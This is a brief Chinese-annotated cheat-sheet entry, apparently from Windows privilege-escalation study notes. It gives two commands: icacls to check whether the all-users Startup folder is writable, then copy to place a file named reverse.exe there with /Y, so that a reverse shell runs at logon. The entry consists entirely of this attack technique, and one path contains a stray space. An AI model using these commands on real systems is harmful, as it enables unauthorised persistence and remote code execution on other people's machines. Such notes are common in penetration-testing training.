# startup

```clike
1. 审查（可写）
icacls "C:\ProgramData\Microsoft\Windows\Start Menu \Programs\Startup"
2. 覆盖
copy C:\PrivEsc\reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu \Programs\Startup" /Y
```
